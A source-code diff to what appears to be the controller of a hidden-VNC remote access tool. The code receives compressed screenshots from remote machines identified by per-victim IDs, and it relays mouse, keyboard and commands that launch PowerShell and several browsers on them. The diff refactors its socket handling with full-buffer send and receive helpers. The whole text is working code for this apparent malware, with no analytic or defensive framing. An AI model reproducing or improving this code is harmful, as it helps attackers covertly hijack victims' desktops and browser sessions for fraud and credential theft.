@@ -15,6 +15,13 @@ static T_RtlDecompressBuffer pRtlDecompressBuffer;
 
 enum Connection { desktop, input, end };
 
+struct InputMessage
+{
+   DWORD msg;
+   DWORD wParam;
+   DWORD lParam;
+};
+
 struct Client
 {
    SOCKET connections[Connection::end];
@@ -43,38 +50,71 @@ enum SysMenuIds   { fullScreen = 101, startExplorer = WM_USER + 1, startRun, sta
 static Client           g_clients[gc_maxClients];
 static CRITICAL_SECTION g_critSec;
 
-static Client *GetClient(void *data, BOOL uhid)
+static Client *GetClientByUhid(DWORD uhid)
 {
    for(int i = 0; i < gc_maxClients; ++i)
    {
-      if(uhid)
-      {
-         if(g_clients[i].uhid == (DWORD) data)
-            return &g_clients[i];
-      }
-      else
-      {
-         if(g_clients[i].hWnd == (HWND) data)
-            return &g_clients[i];
-      }
+      if(g_clients[i].uhid == uhid)
+         return &g_clients[i];
    }
    return NULL;
 }
 
-int SendInt(SOCKET s, int i)
+static Client *GetClientByHwnd(HWND hWnd)
 {
-   return send(s, (char *) &i, sizeof(i), 0);
+   for(int i = 0; i < gc_maxClients; ++i)
+   {
+      if(g_clients[i].hWnd == hWnd)
+         return &g_clients[i];
+   }
+   return NULL;
 }
 
-static BOOL SendInput(SOCKET s, UINT msg, WPARAM wParam, LPARAM lParam)
+static BOOL SendAll(SOCKET s, const void *buffer, int size)
 {
-   if(SendInt(s, msg) <= 0)
-      return FALSE;
-   if(SendInt(s, wParam) <= 0)
-      return FALSE;
-   if(SendInt(s, lParam) <= 0)
-      return FALSE;
+   const char *data = (const char *) buffer;
+   int sent = 0;
+   while(sent != size)
+   {
+      int ret = send(s, data + sent, size - sent, 0);
+      if(ret <= 0)
+         return FALSE;
+      sent += ret;
+   }
    return TRUE;
+}
+
+static BOOL RecvAll(SOCKET s, void *buffer, int size)
+{
+   char *data = (char *) buffer;
+   int received = 0;
+   while(received != size)
+   {
+      int ret = recv(s, data + received, size - received, 0);
+      if(ret <= 0)
+         return FALSE;
+      received += ret;
+   }
+   return TRUE;
+}
+
+static BOOL SendInt(SOCKET s, int i)
+{
+   return SendAll(s, &i, (int) sizeof(i));
+}
+
+static BOOL RecvInt(SOCKET s, int *i)
+{
+   return RecvAll(s, i, (int) sizeof(*i));
+}
+
+static BOOL SendInputMessage(SOCKET s, UINT msg, WPARAM wParam, LPARAM lParam)
+{
+   InputMessage input;
+   input.msg = (DWORD) msg;
+   input.wParam = (DWORD) wParam;
+   input.lParam = (DWORD) lParam;
+   return SendAll(s, &input, (int) sizeof(input));
 }
 
 static void ToggleFullscreen(HWND hWnd, Client *client)
@@ -104,7 +144,7 @@ static void ToggleFullscreen(HWND hWnd, Client *client)
 
 static LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
 {
-   Client *client = GetClient(hWnd, FALSE);
+   Client *client = GetClientByHwnd(hWnd);
 
    switch(msg)
    {
@@ -138,7 +178,7 @@ static LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lPara
          else if(wParam == SysMenuIds::startExplorer)
          {
             EnterCriticalSection(&g_critSec);
-            if(!SendInput(client->connections[Connection::input], SysMenuIds::startExplorer, NULL, NULL))
+            if(!SendInputMessage(client->connections[Connection::input], SysMenuIds::startExplorer, NULL, NULL))
                PostQuitMessage(0);
             LeaveCriticalSection(&g_critSec);
             break;
@@ -146,7 +186,7 @@ static LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lPara
          else if(wParam == SysMenuIds::startRun)
          {
             EnterCriticalSection(&g_critSec);
-            if(!SendInput(client->connections[Connection::input], SysMenuIds::startRun, NULL, NULL))
+            if(!SendInputMessage(client->connections[Connection::input], SysMenuIds::startRun, NULL, NULL))
                PostQuitMessage(0);
             LeaveCriticalSection(&g_critSec);
             break;
@@ -154,7 +194,7 @@ static LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lPara
          else if (wParam == SysMenuIds::startPowershell)
          {
              EnterCriticalSection(&g_critSec);
-             if (!SendInput(client->connections[Connection::input], SysMenuIds::startPowershell, NULL, NULL))
+             if (!SendInputMessage(client->connections[Connection::input], SysMenuIds::startPowershell, NULL, NULL))
                  PostQuitMessage(0);
              LeaveCriticalSection(&g_critSec);
              break;
@@ -162,7 +202,7 @@ static LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lPara
          else if(wParam == SysMenuIds::startChrome)
          {
             EnterCriticalSection(&g_critSec);
-            if(!SendInput(client->connections[Connection::input], SysMenuIds::startChrome, NULL, NULL))
+            if(!SendInputMessage(client->connections[Connection::input], SysMenuIds::startChrome, NULL, NULL))
                PostQuitMessage(0);
             LeaveCriticalSection(&g_critSec);
             break;
@@ -170,7 +210,7 @@ static LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lPara
          else if (wParam == SysMenuIds::startBrave)
          {
              EnterCriticalSection(&g_critSec);
-             if (!SendInput(client->connections[Connection::input], SysMenuIds::startBrave, NULL, NULL))
+             if (!SendInputMessage(client->connections[Connection::input], SysMenuIds::startBrave, NULL, NULL))
                  PostQuitMessage(0);
              LeaveCriticalSection(&g_critSec);
              break;
@@ -178,7 +218,7 @@ static LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lPara
          else if (wParam == SysMenuIds::startEdge)
          {
              EnterCriticalSection(&g_critSec);
-             if (!SendInput(client->connections[Connection::input], SysMenuIds::startEdge, NULL, NULL))
+             if (!SendInputMessage(client->connections[Connection::input], SysMenuIds::startEdge, NULL, NULL))
                  PostQuitMessage(0);
              LeaveCriticalSection(&g_critSec);
              break;
@@ -186,7 +226,7 @@ static LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lPara
          else if(wParam == SysMenuIds::startFirefox)
          {
             EnterCriticalSection(&g_critSec);
-            if(!SendInput(client->connections[Connection::input], SysMenuIds::startFirefox, NULL, NULL))
+            if(!SendInputMessage(client->connections[Connection::input], SysMenuIds::startFirefox, NULL, NULL))
                PostQuitMessage(0);
             LeaveCriticalSection(&g_critSec);
             break;
@@ -194,7 +234,7 @@ static LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lPara
          else if(wParam == SysMenuIds::startIexplore)
          {
             EnterCriticalSection(&g_critSec);
-            if(!SendInput(client->connections[Connection::input], SysMenuIds::startIexplore, NULL, NULL))
+            if(!SendInputMessage(client->connections[Connection::input], SysMenuIds::startIexplore, NULL, NULL))
                PostQuitMessage(0);
             LeaveCriticalSection(&g_critSec);
             break;
@@ -259,7 +299,7 @@ static LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lPara
          y = (int) (y * ratioY);
          lParam = MAKELPARAM(x, y);
          EnterCriticalSection(&g_critSec);
-         if(!SendInput(client->connections[Connection::input], msg, wParam, lParam))
+         if(!SendInputMessage(client->connections[Connection::input], msg, wParam, lParam))
             PostQuitMessage(0);
          LeaveCriticalSection(&g_critSec);
          break;
@@ -269,7 +309,7 @@ static LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lPara
          if(iscntrl(wParam))
             break;
          EnterCriticalSection(&g_critSec);
-         if(!SendInput(client->connections[Connection::input], msg, wParam, 0))
+         if(!SendInputMessage(client->connections[Connection::input], msg, wParam, 0))
             PostQuitMessage(0);
          LeaveCriticalSection(&g_critSec);
          break;
@@ -296,7 +336,7 @@ static LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lPara
                return 0;
          }
          EnterCriticalSection(&g_critSec);
-         if(!SendInput(client->connections[Connection::input], msg, wParam, 0))
+         if(!SendInputMessage(client->connections[Connection::input], msg, wParam, 0))
             PostQuitMessage(0);
          LeaveCriticalSection(&g_critSec);
          break;
@@ -324,10 +364,10 @@ static DWORD WINAPI ClientThread(PVOID param)
    Client    *client = NULL;
    SOCKET     s = (SOCKET) param;
    BYTE       buf[sizeof(gc_magik)];
-   Connection connection;
+   int        connection;
    DWORD      uhid;
 
-   if(recv(s, (char *) buf, sizeof(gc_magik), 0) <= 0)
+   if(!RecvAll(s, buf, (int) sizeof(gc_magik)))
    {
       closesocket(s);
       return 0;
@@ -337,7 +377,7 @@ static DWORD WINAPI ClientThread(PVOID param)
       closesocket(s);
       return 0;
    }
-   if(recv(s, (char *) &connection, sizeof(connection), 0) <= 0)
+   if(!RecvInt(s, &connection))
    {
       closesocket(s);
       return 0;
@@ -351,7 +391,7 @@ static DWORD WINAPI ClientThread(PVOID param)
    }
    if(connection == Connection::desktop)
    {
-      client = GetClient((void *) uhid, TRUE);
+      client = GetClientByUhid(uhid);
       if(!client)
       {
          closesocket(s);
@@ -384,42 +424,45 @@ static DWORD WINAPI ClientThread(PVOID param)
          if((realRight * 3) % 4)
             realRight += ((realRight * 3) % 4);
 
-         if(SendInt(s, realRight) <= 0)
+         if(!SendInt(s, realRight))
             goto exit;
-         if(SendInt(s, realBottom) <= 0)
+         if(!SendInt(s, realBottom))
             goto exit;
 
          DWORD width;
          DWORD height;
          DWORD size;
-         BOOL recvPixels;
-         if(recv(s, (char *) &recvPixels, sizeof(recvPixels), 0) <= 0)
+         int value;
+         if(!RecvInt(s, &value))
             goto exit;
+         BOOL recvPixels = value;
          if(!recvPixels)
          {
             Sleep(gc_sleepNotRecvPixels);
             continue;
          }
-         if(recv(s, (char *) &client->screenWidth, sizeof(client->screenWidth), 0) <= 0)
+         if(!RecvInt(s, &value))
             goto exit;
-         if(recv(s, (char *) &client->screenHeight, sizeof(client->screenHeight), 0) <= 0)
+         client->screenWidth = (DWORD) value;
+         if(!RecvInt(s, &value))
             goto exit;
-         if(recv(s, (char *) &width, sizeof(width), 0) <= 0)
+         client->screenHeight = (DWORD) value;
+         if(!RecvInt(s, &value))
             goto exit;
-         if(recv(s, (char *) &height, sizeof(height), 0) <= 0)
+         width = (DWORD) value;
+         if(!RecvInt(s, &value))
             goto exit;
-         if(recv(s, (char *) &size, sizeof(size), 0) <= 0)
+         height = (DWORD) value;
+         if(!RecvInt(s, &value))
             goto exit;
+         size = (DWORD) value;
 
          BYTE *compressedPixels = (BYTE *) malloc(size);
-         int   totalRead = 0;
-         do
+         if(!RecvAll(s, compressedPixels, (int) size))
          {
-            int read = recv(s, (char *) compressedPixels + totalRead, size - totalRead, 0);
-            if(read <= 0)
-               goto exit;
-            totalRead += read;
-         } while(totalRead != size);
+            free(compressedPixels);
+            goto exit;
+         }
 
          EnterCriticalSection(&g_critSec);
          {
@@ -480,7 +523,7 @@ static DWORD WINAPI ClientThread(PVOID param)
          }
          LeaveCriticalSection(&g_critSec);
 
-         if(SendInt(s, 0) <= 0)
+         if(!SendInt(s, 0))
             goto exit;
       }
 exit:
@@ -492,7 +535,7 @@ exit:
       char ip[16];
       EnterCriticalSection(&g_critSec);
       {
-         client = GetClient((void *) uhid, TRUE);
+         client = GetClientByUhid(uhid);
          if(client)
          {
             closesocket(s);
